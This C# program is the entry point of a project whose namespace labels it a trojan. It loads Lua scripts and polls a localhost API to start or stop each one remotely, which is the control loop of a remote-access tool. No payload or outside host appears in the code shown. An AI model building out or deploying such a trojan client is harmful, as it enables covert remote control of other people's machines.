using Cerberus.Domain.ApiService.ApiService;
using Cerberus.Domain.Models.Machine;
using Cerberus.Presentation.Trojan.Core;
using RestSharp;

public class Program
{
    private static bool Run = true;
    public static LuaResultApiService _luaResultApiService = new LuaResultApiService(new RestClient("http://localhost:5108/api"));
    private static UserApiService _userService = new UserApiService(new RestClient("http://localhost:5108/api"));
    private static ComputerScriptApiService _scriptService = new ComputerScriptApiService(new RestClient("http://localhost:5108/api"));
    private static LuaScriptManager _scriptManager = new LuaScriptManager();

    private static async Task<int> ListenScriptCalls()
    {
         

        List<ComputerScript> _scripts = await _scriptService.GetComputerScripts();
        _scripts = _scripts.ToList();
        List<string> _services = _scriptManager.GetAllScripts();

        foreach (ComputerScript script in _scripts)
        {
            string? service = _services.FirstOrDefault(svc => svc == script.Name);

            if (service != null)
            {
                if (script.Active)
                {
                    _ = await _scriptManager.StartScriptAsync(service);
                }
                else
                {
                    _scriptManager.StopScript(service);
                }
            }

        }

        return 1;

    }


    private static async Task Main(string[] args)
    {

        _scriptManager.LoadScripts();
        _ = await Program.ListenScriptCalls();

    }
}